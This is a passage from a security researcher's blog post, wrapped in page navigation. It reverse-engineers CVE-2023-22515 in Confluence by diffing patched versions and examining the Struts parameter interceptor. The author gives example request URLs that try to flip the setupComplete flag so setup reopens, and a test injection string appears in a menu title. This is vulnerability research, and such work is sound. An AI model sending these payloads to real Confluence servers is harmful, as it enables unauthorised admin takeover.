+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/hack-lu&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/facebook-ctf19-writeup">Facebook CTF'19
+writeup</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/facebook-ctf19-writeup&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/csaw19-ctf">CSAW'19 CTF</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/csaw19-ctf&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/tangled_browsers">tangled_browsers</a>{.aJHbb .hDrhEe
+.HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/tangled_browsers&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/bytebandits-ctf-2020">ByteBandits CTF 2020</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/bytebandits-ctf-2020&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/IuseBing">Google CTF - 2020</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/IuseBing&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/zer0ptsctf2021-challenges">zer0ptsCTF2021-challenges</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/zer0ptsctf2021-challenges&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/site-isolation">site-isolation</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/site-isolation&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/bsidesahm2021">BsidesAHM2021</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/bsidesahm2021&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+</ul>
+</li>
+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIganNuYW1lPSJISUgyViIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTcgMTBsNSA1IDUtNXoiIGZpbGw9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNNCA0aDE2djE2SDR6IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPjwvc3ZnPg==" alt="">{.dvmRw}
+<a href="/research">Research</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/research&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;2&rdquo;}
+<ul>
+<li><a href="/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks">Cookie Tossing to RCE on Google Cloud Jupyter
+Notebooks</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/research/testtest77">test'&gt;&quot;&gt;test{{7*7}}</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/research/testtest77&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/research/PP">Prototype Pollution</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/research/PP&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/research/brokenconflu">BrokenConflu</a>{.aJHbb .hDrhEe
+.HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+aria-selected=&ldquo;true&rdquo; url=&quot;/research/brokenconflu&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+</ul>
+</li>
+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIganNuYW1lPSJISUgyViIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTcgMTBsNSA1IDUtNXoiIGZpbGw9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNNCA0aDE2djE2SDR6IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPjwvc3ZnPg==" alt="">{.dvmRw}
+<a href="/about-me">About Me</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/about-me&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;2&rdquo;}
+<ul>
+<li><a href="/about-me/Looking-Back-Looking-Forward">Looking Back Looking Forward:
+2021</a>{.aJHbb .hDrhEe
+.HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/about-me/Looking-Back-Looking-Forward&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/inspiration">Inspiration</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/inspiration&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+</ul>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0idnU4UHdlIHRDSFhEYyBZU0g5SiIgdmlld2JveD0iMCAwIDI0IDI0IiBmb2N1c2FibGU9ImZhbHNlIj48cGF0aCBkPSJNMTUuNSAxNGgtLjc5bC0uMjgtLjI3QzE1LjQxIDEyLjU5IDE2IDExLjExIDE2IDkuNSAxNiA1LjkxIDEzLjA5IDMgOS41IDNTMyA1LjkxIDMgOS41IDUuOTEgMTYgOS41IDE2YzEuNjEgMCAzLjA5LS41OSA0LjIzLTEuNTdsLjI3LjI4di43OWw1IDQuOTlMMjAuNDkgMTlsLTQuOTktNXptLTYgMEM3LjAxIDE0IDUgMTEuOTkgNSA5LjVTNy4wMSA1IDkuNSA1IDE0IDcuMDEgMTQgOS41IDExLjk5IDE0IDkuNSAxNHoiIC8+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48L3N2Zz4=" alt="">{.vu8Pwe
+.tCHXDc .YSH9J}</p>
+<h1 id="h.n671hbs3m557" class="zfr3Q duRjpb CDt4Ke" dir="ltr" style="text-align: center;">CVE-2023-22515 - Broken Access Control Vulnerability in Confluence Data Center and Server</h1>
+<p>I saw the below tweet by
+<a href="https://twitter.com/TheGrandPew/status/1711710856353022409">TheGrandPew</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;} on my
+feed, and I wanted to give it a try along with <a href="https://twitter.com/iamnoooob">Rahul
+Maini</a>{.XqQF9c target=&quot;_blank&quot;
+style=&ldquo;color: inherit; text-decoration: none;&rdquo;}. Me, Rahul and few other
+friends were attending BSides Ahmedabad Conference. So thought, it would
+be fun exercise to reverse it while attending some talks.<br>
+<br>
+The tweet sounded like the vulnerablity is very easy to reproduce. But,
+to be honest, I spent so much time like 10-12 hours every day for 2 days
+straight, maybe because I don't have experience in Java exploitation( I
+always hated Java challenges in CTF).</p>
+<p>It is my first time looking at Apache struts application, never got
+chance to work on it and I had zero knowledge on how it works which made
+it really time consuming as I have to search for &quot;What is struts.xml&quot;,
+&quot;What is ONGL?&quot; etc.</p>
+<p><img src="https://lh6.googleusercontent.com/6wNVgi9abtmy3Gl6RHtR9AXzR8trHQPxwB4uUS94WyAlJXLmfS5J1qP-efVOv-EzlJign-HMkVN8VSoECWUjgMeq9nKIxAWsYRr9O20wR8YqndWMMxrUi2mC6Qo4tVdtiw=w1280" alt="">{.CENy8b
+role=&ldquo;img&rdquo;}</p>
+<h2 id="h.qqm6r0u4m9ya_l" class="zfr3Q JYVBee CDt4Ke" dir="ltr" style=""></h2>
+<p><a href="#h.qqm6r0u4m9ya"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.qqm6r0u4m9ya_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>Initial Diffing between 8.5.1 and 8.5.2 </p>
+<p>After reading the
+<a href="https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html">advisory</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;}, it was
+apparent that the vulnerability exist in /setup/* actions. </p>
+<p>Downloaded the vulnerable and fixed version from
+<a href="https://www.atlassian.com/software/confluence/download-archives">here</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;} and
+started working on it. </p>
+<h3 id="h.dsuj9j71euo_l" class="zfr3Q OmQG5e CDt4Ke" dir="ltr" style=""></h3>
+<p><a href="#h.dsuj9j71euo"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.dsuj9j71euo_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>Rabbit Hole / Mistake 1</p>
+<p>The confluence archieve is very big and there are lot of jar files in
+it. So, we mistakenly decided to only look at diff for the the JAR files
+which has &quot;confluence&quot; name in it. Using, the below command you can
+extract the source code from JAR files.<br>
+\</p>
+<p>find ./atlassian-confluence-8.5.1/confluence/WEB-INF/lib/ -type f -name
+&quot;*confluence*&quot; -exec find {} -type f -name &quot;*.jar&quot; \; | xargs
+-I {} jadx -d 8.5.1 {} --comments-level none</p>
+<p><br>
+Using, VSCode Diff plugin and looking at the changed files and modified
+code.</p>
+<p><img src="https://lh5.googleusercontent.com/fW9YKTgMH4JZpgVNbSYHed-FKXqBUDCNrB0XTSVyjp2ha9DSk-YjpCVa5SFbWtmUzyTY29Vs5AtHtzXm8zTWreBFIPGYz1560xq8KphiLf7m4OmJM8MQtKSdIS_N-3OanQ=w1280" alt="">{.CENy8b
+role=&ldquo;img&rdquo;}</p>
+<p>There are few other files which has code changed, but they didn't look
+interesting. However, The above file caught the eye, as you can see they
+are wrapping ApplicationConfig and SetupPersister with ReadOnly***
+classes and these new ReadOnly** class files were newly added in the
+8.5.2 fixed version.</p>
+<p><img src="https://lh5.googleusercontent.com/Bl2JOvcDZ1RAhuDm8MpIi6YCx0vgKdLJzaql41OQpqK-nBLjFfBWY1Iys-3QwZnE4WFsSrweTPESEmyRsS8YDLRBp9Gl4hKHQu3D9qSSjryg8noqbSDSDes-atOfJU-xXQ=w1280" alt="">{.CENy8b
+role=&ldquo;img&rdquo;}</p>
+<p>If you notice the overridden functions of these classes it can be
+noticed that functions such as setSetupComplete, setSetupType, and
+setProperty were all disallowed.</p>
+<h3 id="h.d9pdsh38rwm6_l" class="zfr3Q OmQG5e CDt4Ke" dir="ltr" style=""></h3>
+<p><a href="#h.d9pdsh38rwm6"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.d9pdsh38rwm6_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>The Goal</p>
+<p>Looking at the advisory and patches made one thing clear, which is we
+need to somehow make the setup to incomplete which restarts the
+confluence setup; thereby allowing us to add new admin user or add new
+database configuration.</p>
+<p>Having this in mind, started looking at ways to modify the application
+config in only the JARs with &quot;confluence&quot; name in it. </p>
+<p>Looking at the struts.xml and specifically namespace=&quot;/setup&quot; which is
+responsible for all the setup related endpoints/actions, started
+reviewing the source code of these Actions. None of them has anything
+interesting which can help us modify the application config.</p>
+<p>struts.xml is a configuration file used in the Apache Struts framework
+for defining the mapping between web requests and corresponding actions
+or resources, facilitating the creation of Java web applications with
+predefined conventions and configurations.</p>
+<p>All of the requests /setup/** endpoint are intercepted by below
+struts.xml interceptor. Interceptors are just middle-wares which
+intercept request and responses.</p>
+<p>&lt;interceptor name=&quot;setup&quot;
+class=&quot;com.atlassian.confluence.setup.actions.SetupCheckInterceptor&quot;/&gt;<br>
+[...]<br>
+  &lt;package name=&quot;setup&quot; extends=&quot;default&quot; namespace=&quot;/setup&quot;&gt;</p>
+<p>        &lt;default-interceptor-ref name=&quot;validatingSetupStack&quot;/&gt;</p>
+<p>[...]</p>
+<p>By looking at the source code of SetupCheckInterceptor, we can deduce
+that we need to return isSetupComplete to be false, so that we can hit
+the /setup/ endpoints.</p>
+<p>#Archive2/8.5.1/sources/com/atlassian/confluence/setup/actions/SetupCheckInterceptor.java<br>
+public String intercept(ActionInvocation actionInvocation) throws
+Exception {</p>
+<p>if (BootstrapUtils.getBootstrapManager().isSetupComplete() &amp;&amp;
+ContainerManager.isContainerSetup()) {</p>
+<p>return ALREADY_SETUP;</p>
+<p>}</p>
+<p>return actionInvocation.invoke();</p>
+<p>}</p>
+<p>\</p>
+<p>#Archive2/8.5.1/sources/com/atlassian/config/ApplicationConfig.java<br>
+public class ApplicationConfig implements ApplicationConfiguration {</p>
+<p>\</p>
+<p>@Override // com.atlassian.config.ApplicationConfiguration</p>
+<p>public synchronized boolean isSetupComplete() {</p>
+<p>return this.setupComplete;</p>
+<p>}</p>
+<h3 id="h.2zzksjn15151_l" class="zfr3Q OmQG5e CDt4Ke" dir="ltr" style="line-height: 1.7999999999999998;"></h3>
+<p><a href="#h.2zzksjn15151"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.2zzksjn15151_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>Deadlock???<br>
+Our task is to somehow make setupComplete to false, and the calls to
+setSetupComplete(false) are made inside /setup/** actions. There is no
+way to reach setSetupComplete calls without bypassing
+SetupCheckInterceptor. So, I started looking at other conditions in
+interceptor which is ContainerManager.isContainerSetup(). I attached
+debugger and see what it does and realized that its not possible to make
+it return false.</p>
+<p><br>
+I was stuck here for several hours debugging, and trying random stuff
+but not going anywhere and I was getting frustrated as there is no way I
+can set setupComplete to false. Then Pew told me to look at other
+interceptors, so I started decompiling all the other JAR files and see
+the differences. Upto my surprise, there is one interesting JAR which
+has lot of changes which is
+/atlassian-confluence-8.5.2/confluence/WEB-INF/lib/com.atlassian.struts2_struts-support-1.2.0.jar.
+At this moment, I felt so frusrtated because of not diffing whole source
+code which costed me several hours on doing random shit.</p>
+<h3 id="h.jzedg1zgud61_l" class="zfr3Q OmQG5e CDt4Ke" dir="ltr" style=""></h3>
+<p><a href="#h.jzedg1zgud61"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.jzedg1zgud61_l&rdquo;}</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iT1VHRXIgUWRBZGhmIiB3aWR0aD0iMjJweCIgaGVpZ2h0PSIyMnB4IiB2aWV3Ym94PSIwIDAgMjQgMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIgLz48cGF0aCBkPSJNMy45IDEyYzAtMS43MSAxLjM5LTMuMSAzLjEtMy4xaDRWN0g3Yy0yLjc2IDAtNSAyLjI0LTUgNXMyLjI0IDUgNSA1aDR2LTEuOUg3Yy0xLjcxIDAtMy4xLTEuMzktMy4xLTMuMXpNOCAxM2g4di0ySDh2MnptOS02aC00djEuOWg0YzEuNzEgMCAzLjEgMS4zOSAzLjEgMy4xcy0xLjM5IDMuMS0zLjEgMy4xaC00VjE3aDRjMi43NiAwIDUtMi4yNCA1LTVzLTIuMjQtNS01LTV6IiAvPjwvc3ZnPg==" alt="">{.OUGEr
+.QdAdhf}</p>
+<p>SafeParametersInterceptor.java</p>
+<p>In com.atlassian.struts2_struts-support-1.2.0.jar, there is one file
+that got modified which is
+sources/com/atlassian/xwork/interceptors/SafeParametersInterceptor.java.
+This file is an one more interceptor in struts.xml, which turned out to
+be responsible for parsing the query parameters in the URL, parsing the
+POST body parameters.<br>
+\</p>
+<p>&lt;interceptor name=&quot;params&quot;
+class=&quot;com.atlassian.xwork.interceptors.SafeParametersInterceptor&quot;/&gt;</p>
+<p><img src="https://lh6.googleusercontent.com/98hjJyTwo9tEDcCchk4Vg2e5DpxJuguaYHpmkIbuitin_8x1g2W5matYCaxc4xJaikKIa6v3IVW3fWIQrxf7kgIrDPBMARJ8Q48UyR7jUJzkw5oqCQbRgAplXdtF1VclNg=w1280" alt="">{.CENy8b
+role=&ldquo;img&rdquo;}</p>
+<p>I started reading the code of SafeParameterInterceptors and it looked
+very interesting, and little bit surprised on the way they handling the
+request parameters. So what it does is it intercepts incoming HTTP
+requests, extracts parameters, and sets them as properties of the action
+being invoked.<br>
+<br>
+For example if you are calling /person.action?name=s1r1us, it parses the
+query parameter name=s1r1us, and on the PersonAction.class object it
+calls the method of PersonAction, which is
+PersonAction.setName('s1r1us').<br>
+<br>
+Interesting enough, you can also have nested parameters like
+/person.action?address.city=asdf which will call
+PersonAction.getAddress().setCity('asdf'). The parsing of the query
+parameters and executing them on the Action objects are performed using
+<a href="https://commons.apache.org/dormant/commons-ognl/language-guide.html">OGNL</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;}.</p>
+<p>In the first look, this looked so surprising and insecure but this is
+how struts also does in
+<a href="https://struts.apache.org/core-developers/parameters-interceptor">ParamInterceptor</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;} which
+SafeParameterInterceptor inherits. And obviously as expected, there was
+an RCE in struts on this ParamInterceptor once?
+<a href="https://www.exploit-db.com/exploits/24874">here</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;}?. </p>
+<p>My initial idea is to used nested parameters to access and set
+setupcomplete to false on AppliccationConfig. This can be done as</p>
+<p> <br>
+((LoginAction)
+action).getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false)</p>
+<p>When its translated to query parameter this would look something like </p>
+<p><a href="https://vuln.com/some.action?blah.applicationConfig.setupComplete=false">https://vuln.com/some.action?bootstrapStatusProvider.applicationConfig.setupComplete=0</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;}</p>
+<p>or<br>
+<a href="https://vuln.com/some.action?blah.applicationConfig.setupComplete=false">https://vuln.com/some.action?bootstrapStatusProvider['applicationConfig']['setupComplete']=false</a>{.XqQF9c
+target=&quot;_blank&quot; style=&ldquo;color: inherit; text-decoration: none;&rdquo;}</p>
+<p>This would be turned to
+Action.getBlah().getApplicationConfig().setSetupComplete('false')</p>
+<p>But, again I fell in another Rabbit hole which again costed me so many
+hours.</p>
+<p><img src="https://lh4.googleusercontent.com/eV_MYXw5KCZtUNdDHeQU5D1TW1dZv5DlrlIPTn-Qy9giF8HjTwXvI_pqwIF7jhc4LBiwR7npOUpaE-TsTZsLJfNFRzQMdPbltmIv051Umj8OFfPlCReh30COKqpyoE4oiA=w1280" alt="">{.CENy8b
+role=&ldquo;img&rdquo;}</p>
+<p>\</p>
+<h3 id="h.d416rzfiq7e2_l" class="zfr3Q OmQG5e CDt4Ke" dir="ltr" style=""></h3>
+<p><a href="#h.d416rzfiq7e2"></a>{.FKF6mc .TpQm9d aria-label=&ldquo;Copy heading link&rdquo;
+jsname=&ldquo;hiK3ld&rdquo; role=&ldquo;button&rdquo; aria-describedby=&ldquo;h.d416rzfiq7e2_l&rdquo;}</p>
